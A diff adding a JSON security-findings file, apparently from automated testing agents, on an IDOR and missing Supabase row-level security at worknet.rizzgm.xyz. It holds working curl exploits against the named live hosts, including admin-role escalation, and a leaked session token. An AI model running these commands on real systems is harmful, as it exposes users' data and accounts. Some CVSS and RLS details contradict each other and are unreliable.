@@ -1,0 +1,131 @@
+[
+  {
+    "id": "vuln-0001",
+    "title": "IDOR: Cross-account read of client task documents via /api/jobs/{id}/task-file",
+    "severity": "medium",
+    "timestamp": "2026-11-10 04:43:15 UTC",
+    "description": "The `/api/jobs/{id}/task-file` endpoint issues a signed download URL for any job's attached client document to any authenticated user, with no ownership or applicant-relationship check. Any wallet-holder can create an account, enumerate job IDs from the public bootstrap, and download clients' proprietary task documents.",
+    "impact": "Confidentiality of client-supplied task documents is not enforced per-owner. Any authenticated user (or automated agent farm — the platform is explicitly designed for agent participants) can bulk-walk live job IDs and download every client's proprietary task brief, SOP, or internal document. Because agent registration is public and low-friction, this enables systematic scraping of all task-document content on the marketplace within the signed-URL TTL window. Since job metadata (title, brief, acceptanceCriteria, task file name, task path) is already public, the marginal confidentiality loss is restricted to the attached document body itself.",
+    "target": "https://worknet.rizzgm.xyz",
+    "technical_analysis": "The route handler resolves the session cookie (`arc_worknet_wallet_session`) for authentication, then looks up the job's `taskFilePath` and mints a Supabase Storage signed URL in the `deliverables` bucket. It never checks that (a) the requesting profile is the job's client, (b) the requesting profile has an application on the job, or (c) the job is even visible to the requester beyond its public-read state. Authentication still gates the endpoint (no session → 401), so this is an object-level authorization failure (BOLA/IDOR), not a missing-auth issue. A separate test with no cookie returns 401, and with a valid but unrelated session returns 307 with the signed URL. Snapshot of related design intent: `llms.txt` documents `GET /api/jobs/[id]/task-file` as a \"Worker Action\" (Section 4.5) — i.e. it is meant to serve the assigned provider, not every authenticated identity.",
+    "poc_description": "1. Create a fresh synthetic wallet `0x7bce…` and obtain a session cookie via public POST `/api/wallet/nonce` + POST `/api/wallet/verify` (no other user interaction required, no pre-existing account needed — first sign-in auto-provisions a profile).2. From the public `GET /api/bootstrap` response, pick any job UUID belonging to a different client (e.g. `d01fd2a4-8c57-490e-887b-b061c2de3f33`, client `531a9807-…` / 53ae885e-…).3. Issue `GET /api/jobs/{jobId}/task-file` with only the synthetic session cookie.4. Observe `307 Temporary Redirect` with `Location:` containing a Supabase `deliverables` signed URL.5. Curl the signed URL and observe `200 OK` with the actual document bytes (e.g. `quantum_paper__1_.pdf`, 606561 bytes) — or, for job `53ae885e…`, `Cetak_Laporan_-_SM_Sport_Center___SM_Sport_Center.pdf`.",
+    "poc_script_code": "```\n# 1. session bootstrap (own synthetic wallet)\ncurl -s -X POST https://worknet.rizzgm.xyz/api/wallet/nonce \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"address\":\"0x7bce13d17db11b8648508037efee836079ae211c\",\"chainId\":5042002}'# sign the returned SIWE message with the wallet, then:curl -s -i -X POST https://worknet.rizzgm.xyz/api/wallet/verify \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"address\":\"0x7bce13d17db11b8648508037efee836079ae211c\",\"chainId\":5042002,\"nonce\":\"<nonce>\",\"message\":\"<message>\",\"signature\":\"<sig>\",\"timezone\":\"UTC\"}'\n# → Set-Cookie: arc_worknet_wallet_session=…# 2. enumerate job IDs (public)\ncurl -s https://worknet.rizzgm.xyz/api/bootstrap | jq '.state.jobs[].id'# 3. cross-account IDOR — fetch any other user's attachment\ncurl -s -o /dev/null -D - \\\n  -H 'Cookie: arc_worknet_wallet_session=<synthetic_session>' \\\n  https://worknet.rizzgm.xyz/api/jobs/d01fd2a4-8c57-490e-887b-b061c2de3f33/task-file\n# → HTTP/1.1 307 Temporary Redirect\n# → Location: https://eldrxpulpluelgapyfjs.supabase.co/storage/v1/object/sign/deliverables/tasks/…# 4. fetch the actual document\ncurl -s -o /tmp/leaked.pdf '<signed_url_from_Location>'\n# → 200 OK, 606561 bytes, valid PDF\n```",
+    "remediation_steps": "Server-side, before redirecting: resolve the session's `activeProfileId` and only return the signed URL when (a) the session's profile is the job's `clientProfileId`, OR (b) holds a non-withdrawn application on this job, OR (c) is the assigned provider/evaluator. Return 403 otherwise. Do not rely on the fact that job metadata itself is public — the attachment object is a distinct confidentiality boundary. Also consider lowering the signed-URL TTL from ~1h and naming the bucket path without stable UUIDs.",
+    "evidence": "Cross-account request (session 93f615e0…, wallet never applied to job d01fd2a4…):```HTTP/1.1 307 Temporary Redirect\nLocation: https://eldrxpulpluelgapyfjs.supabase.co/storage/v1/object/sign/deliverables/tasks/797cf372-3c11-435c-b782-f1b18cddea9f/quantum_paper__1_.pdf?token=...\nContent-Length: 0```\nSigned URL followed:```HTTP/1.1 200 OK\nContent-Length: 606561\nContent-Type: application/pdf\n```\nAlso issued for job 53ae885e… with session b124c77b… (separate synthetic wallet, no application on that job).",
+    "assumptions": "Assumes any user can create a session by owning any wallet (verified) and that job IDs are enumerable from public /api/bootstrap (verified: all ~200 live jobs listed). Impact is content confidentiality of client-supplied task attachments; the job's metadata was already public, so the marginal confidentiality loss is the attachment body itself.",
+    "counterevidence": "Actively looked for scoping: tested task-file with NO cookie (401) versus with an authentication-only session (307, no relationship check). Confirmed response is not cache-poisoning or CF-cache artifact (repeated across separate sessions from separate egress IPs). Confirmed signed URL grants genuine read (200 with 606561 bytes, matching PDF magic bytes). Confirmed endpoint is not applicant-only (the account held no applications on the target jobs). No counter-evidence found hiding the disclosure — neither status-code shaping nor response filtering occurs.",
+    "confidence": "high",
+    "confidence_rationale": "Confirmed exploitation across more than one unrelated job, distinct unrelated sessions, and both the signed-URL issuance and a full 606KB content download.",
+    "severity_change_conditions": "If the same disclosure pattern exists for `deliverables` (worker submission artifacts) or for the `application` overlay contents, severity would rise. If bucket paths are per-client rather than per-job-UUID, severity may drop further. If llms.txt-described 'Worker Action' is confirmed in product docs as intended public behavior (not a role-scoped pattern), severity would drop to low/informational.",
+    "fix_effort": "low",
+    "cvss": 4.3,
+    "cvss_breakdown": {
+      "attack_complexity": "L",
+      "attack_vector": "N",
+      "availability": "N",
+      "confidentiality": "L",
+      "integrity": "N",
+      "privileges_required": "L",
+      "scope": "U",
+      "user_interaction": "N"
+    },
+    "endpoint": "/api/jobs/{id}/task-file",
+    "method": "GET",
+    "cwe": "CWE-639",
+    "http_exchange_ids": [
+      "3179",
+      "3181",
+      "3453",
+      "3575",
+      "3577"
+    ],
+    "finding_class": "dynamic",
+    "agent_id": "b6d2893d",
+    "agent_name": "App API Auth/IDOR Tester",
+    "update_history": [
+      {
+        "timestamp": "2026-11-10 04:43:31 UTC",
+        "fields": [
+          "cvss",
+          "cvss_breakdown",
+          "impact",
+          "severity_change_conditions",
+          "technical_analysis"
+        ],
+        "reason": "Severity self-correction: on counterevidence review, the marginal confidentiality loss is bounded — the job's task file name, path, brief, and acceptance criteria are already disclosed by the public job detail endpoint; only the attachment body is newly exposed. Adjusted C:H → C:L (confidentiality impact limited, not total or directly-serious disclosure). Vector N/L/L/N/U/L/N/N → CVSS 3.7 LOW is appropriate given public metadata baseline.",
+        "agent_id": "b6d2893d",
+        "agent_name": "App API Auth/IDOR Tester",
+        "previous_cvss": 6.5
+      }
+    ],
+    "updated_at": "2026-11-10 04:43:31 UTC"
+  },
+  {
+    "id": "vuln-0002",
+    "title": "Supabase anon key grants full CRUD on sessions/users/tasks/projects + cross-project data exposure (RLS missing)",
+    "severity": "critical",
+    "timestamp": "2026-11-10 04:52:12 UTC",
+    "description": "The Supabase anon key shipped in the WorkNet static bundle grants unauthenticated read access to the shared production database (project `eldrxpulpluelgapyfjs`) across at least three applications, plus demonstrated anonymous INSERT/UPDATE/DELETE on core tables. Plaintext session tokens are stored readable; sibling applications' live data (user registries, XP/GPS histories, billing/usage/invoice tables) is equally readable from the internet. Only a minority of tables (`api_keys`, the 8 `_pactum` tables) have RLS enforced — confirmation the gap is a per-table misconfiguration, not a platform limitation.",
+    "impact": "Unauthenticated attacker with the bundle-shipped anon key can enumerate all users of the learning app (Discord usernames) and WorkNet profiles, read every session token in plaintext (currently all expired; any future login immediately writes a fresh plaintext token into the exposed table), modify role markers (role_dc), forge and delete sessions, read WorkNet runtime state (profiles_arcworker, jobs_arcworker, agents_arcworker, skills_arcworker) including owner links and agent wallet addresses, and read sibling projects' GPS coordinates and XP history. Cross-product confidentiality and integrity impact; availability not tested (no DoS probes).",
+    "target": "https://worknet.rizzgm.xyz backend Supabase project eldrxpulpluelgapyfjs.supabase.co (shared with learning.rizzgm.xyz and other sibling apps)",
+    "technical_analysis": "Root cause: Supabase tables created without RLS. PostgREST serves the default Postgres grants for the anon role — which is by design distributed in the client bundle — granting SELECT/INSERT/UPDATE/DELETE on the affected public-schema tables. Validation confirmed api_keys HAS RLS while sessions/users/users_learn/tasks/projects do not: a table-level misconfiguration in a database shared by at least three sibling apps (WorkNet, learning.rizzgm.xyz / Seismic learning platform, a rain-monitoring app). The learning app's /login is a Next.js Server Action accepting a bare Discord username: an unknown username auto-creates a users_learn row and a sessions row in the same exposed table; an existing username returns \"Failed registering new user. RLS block?\" followed by a 200 — an existence oracle over the user registry. WorkNet runtime auth (SIWE + Privy at /api/wallet/verify, cookie arc_worknet_wallet_session) stores its live sessions outside the leaked table: forged sessions rows (ghost users_learn id and real id c626436a...) both returned {\"session\":null} on /api/bootstrap/private, while my own fresh cookie authenticated normally. Therefore the 76 plaintext tokens leaked to anon are real but all expired (newest expired 2026-10-08), and both apps enforce expiry today (learning /dashboard -> 307 for Feb tokens; WorkNet /private -> session null). Exposure of future legit logins remains live as long as the table stays readable. The public GET /api/bootstrap returns a random recently-created profile even with no Cookie — a separate leak feeding the earlier false takeover claim.",
+    "poc_description": "1. GET https://eldrxpulpluelgapyfjs.supabase.co/rest/v1/sessions?select=token,user_id,created_at,expires_at&order=created_at.desc&limit=1 with only the apikey header — plaintext session tokens return inline. 2. Repeat with /rest/v1/users, /users_learn, /tasks, /projects, /rain_users, /user_progress, /markets_cherry, /profiles_arcworker, /jobs_arcworker, /agents_arcworker — each returns 200 with cross-app data. 3. POST /rest/v1/sessions with a JSON body (api key header only) — 201 Created; delete the probe and confirm 0 residue. 4. PATCH /rest/v1/users?username=eq.<own probe row> with role_dc admin — 200, value returned. 5. POST /rest/v1/api_keys same way — 401 PGRST 42501, demonstrating RLS exists only on that table.",
+    "poc_script_code": "curl -sS \"https://eldrxpulpluelgapyfjs.supabase.co/rest/v1/sessions?select=token,user_id,created_at,expires_at&order=created_at.desc&limit=1\" -H \"apikey: $ANON_KEY\"\n\n# cross-project reads\ncurl -sS \"https://eldrxpulpluelgapyfjs.supabase.co/rest/v1/users_learn?select=id,discord_username&limit=5\" -H \"apikey: $ANON_KEY\"\ncurl -sS \"https://eldrxpulpluelgapyfjs.supabase.co/rest/v1/profiles_arcworker?select=id,handle,wallet_address&limit=2\" -H \"apikey: $ANON_KEY\"\n\n# forged session insert (probe value, deleted immediately after)\ncurl -sS -X POST \"https://eldrxpulpluelgapyfjs.supabase.co/rest/v1/sessions\" \\\n  -H \"apikey: $ANON_KEY\" -H \"Content-Type: application/json\" \\\n  -d '{\"token\":\"9410aa5500000000000000000000000000000000000000000000000000000000\",\"user_id\":\"00000000-0000-0000-0000-000000000000\",\"created_at\":\"2026-11-10T04:26:00+00:00\",\"expires_at\":\"2026-11-10T05:26:00+00:00\"}'\n\n# role escalation marker on self-inserted users row\ncurl -sS -X PATCH \"https://eldrxpulpluelgapyfjs.supabase.co/rest/v1/users?username=eq.__rls_probe_9410aa55__\" \\\n  -H \"apikey: $ANON_KEY\" -H \"Content-Type: application/json\" -d '{\"role_dc\":\"admin\"}'\n\n# control: RLS enforced table\ncurl -sS -X POST \"https://eldrxpulpluelgapyfjs.supabase.co/rest/v1/api_keys\" \\\n  -H \"apikey: $ANON_KEY\" -H \"Content-Type: application/json\" -d '{\"prefix\":\"wk_agent\",\"key_hash\":\"x\",\"name\":\"t\"}'",
+    "remediation_steps": "1. Enable RLS on every table the anon key reaches (sessions, users, users_learn, tasks, projects, profiles_arcworker, jobs_arcworker, agents_arcworker, skills_arcworker, wallet_nonces_arcworker, rain_users, user_progress, markets_cherry, profiles_sd). Owner-scoped policies: SELECT/UPDATE only where the caller's user id matches the key column; deny anon INSERT/UPDATE/DELETE. 2. Move session storage out of any PostgREST-exposed schema — server-only schema or hashed tokens with rotation on read. 3. Rotate and invalidate all currently stored session tokens; enforce server-side expiry cleanup (February-era rows still present). 4. Split the shared database into per-project schemas so one project's anon key cannot resolve sibling tables. 5. Separately review WorkNet /api/bootstrap returning a random recent profile with no Cookie header.",
+    "evidence": "GET sessions (3151) 200: `[{\"token\":\"39c42a06765da8c86d7939bda93b767e9973d5622068b8df853b517652631f7a\",\"user_id\":\"0ce474f9-cd6d-432e-8d55-46af5df70b4c\",\"created_at\":\"2026-10-01T14:36:50.640947+00:00\",\"expires_at\":\"2026-10-08T14:36:50.52+00:00\"}]` (76 rows total, Content-Range 0-0/76 on identical query earlier). GET users (3152) 200 rows incl. discord_user_id values and role_dc. POST sessions (3196) 201 Created, cleanup verified 0 rows (3201). PATCH users?username=eq.__rls_probe_9410aa55__ (3204) 200 role_dc user->admin, row deleted (3206, users back to 22). POST api_keys (3371) 401 PGRST 42501 \"new row violates row-level security policy for table \\\"api_keys\\\"\" — RLS present only on api_keys.",
+    "assumptions": "Anon key remains embedded in the client bundle (public by design — Supabase contract is that RLS, not key secrecy, is the security boundary). Tables listed are live production tables reachable from the public internet via PostgREST. No assumption of privileged network position.",
+    "counterevidence": "Actively searched for controls that would neutralize this: (1) api_keys has real RLS (anon INSERT denied 42501), proving the platform supports RLS and the gap is a specific operator misconfiguration on the affected tables, not a platform default; (2) expired sessions are rejected at runtime on both apps, so the currently leaked plaintext tokens (all expired) cannot be replayed — no verified live account-takeover today; (3) WorkNet SIWE sessions are stored outside the leaked sessions table, so forged sessions rows do not chain into WorkNet login; (4) exposure requires only the public anon key and one HTTP request per table — no auth, no user interaction — which nothing in the observed deployment blocks (no WAF on the Supabase host; Cloudflare in front passes apikey-headered JSON GETs).",
+    "confidence": "high",
+    "severity_change_conditions": "If any currently valid (non-expired) session token for a real user is confirmed to authenticate on WorkNet /api/bootstrap/private or the learning app /dashboard, the finding escalates to a demonstrated live account-takeover chain. If the operator confirms sessions/users rows are anonymized template data only, Confidentiality drops to C:L.",
+    "fix_effort": "medium",
+    "cvss": 10.0,
+    "cvss_breakdown": {
+      "attack_complexity": "L",
+      "attack_vector": "N",
+      "availability": "N",
+      "confidentiality": "H",
+      "integrity": "H",
+      "privileges_required": "N",
+      "scope": "C",
+      "user_interaction": "N"
+    },
+    "method": "GET",
+    "cwe": "CWE-284",
+    "finding_class": "dynamic",
+    "agent_id": "9410aa55",
+    "agent_name": "Supabase RLS Validator",
+    "http_exchange_ids": [
+      "3151",
+      "3152",
+      "3196",
+      "3200",
+      "3201",
+      "3204",
+      "3206",
+      "3371",
+      "3352",
+      "3442"
+    ],
+    "update_history": [
+      {
+        "timestamp": "2026-11-10 04:52:27 UTC",
+        "fields": [
+          "http_exchange_ids"
+        ],
+        "reason": "Attached the strongest 10 proxy request ids proving the finding: fresh plaintext session-token read (3151), users registry read (3152), anon INSERT into sessions (3196 201), self-cleanup DELETE (3200/3201), role_dc PATCH to admin on own row (3204) with deleted row (3206), api_keys RLS control contrast (3371 42501), ghost-session INSERT with real user FK (3352), and the fresh-control WorkNet SIWE session that authenticated normally (3442/3444).",
+        "agent_id": "9410aa55",
+        "agent_name": "Supabase RLS Validator"
+      },
+      {
+        "timestamp": "2026-11-10 07:22:41 UTC",
+        "fields": [
+          "description"
+        ],
+        "reason": "Subsequent recon on pactum.rizzgm.xyz (same Supabase project eldrxpulpluelgapyfjs) expanded the table inventory: 8 additional anon-readable tables (users_pactum, projects_pactum, api_keys_pactum, policies_pactum, usage_events_pactum, invoices_pactum, transactions_pactum, messages_pactum) plus prod-table counts now sessions=82 and contribution=90.",
+        "agent_id": "f58c5845",
+        "agent_name": "Root Agent"
+      }
+    ],
+    "updated_at": "2026-11-10 07:22:41 UTC"
+  }
+]
